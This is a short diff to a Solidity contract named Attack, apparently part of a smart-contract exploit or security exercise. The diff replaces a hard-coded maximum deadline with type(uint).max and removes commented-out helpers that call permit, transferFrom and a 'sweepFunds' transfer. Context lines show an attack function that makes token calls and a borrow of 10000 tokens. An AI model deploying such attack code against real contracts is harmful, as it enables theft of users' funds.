@@ -32,7 +32,7 @@ contract Attack {
 
     function attack(uint tokenAmount) external payable {
         //transfer token
-        uint deadline = 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff;
+        uint deadline = type(uint).max;
 
         tokenAddress.functionCall(
             abi.encodeWithSignature(
@@ -71,34 +71,4 @@ contract Attack {
             abi.encodeWithSignature("borrow", 10000 * 10 ** 18, msg.sender)
         );
     }
-
-    // function deposit(
-    //     address owner,
-    //     address spender,
-    //     uint256 value,
-    //     uint256 deadline
-    // ) internal {
-    //     tokenAddress.functionCall(
-    //         abi.encodeWithSignature(
-    //             "permit",
-    //             owner,
-    //             spender,
-    //             value,
-    //             deadline,
-    //             v,
-    //             r,
-    //             s
-    //         )
-    //     );
-
-    //     tokenAddress.functionCall(
-    //         abi.encodeWithSignature("transferFrom", owner, spender, value)
-    //     );
-    // }
-
-    // function sweepFunds(address to, uint value) internal {
-    //     tokenAddress.functionCall(
-    //         abi.encodeWithSignature("transfer", to, value)
-    //     );
-    // }
 }
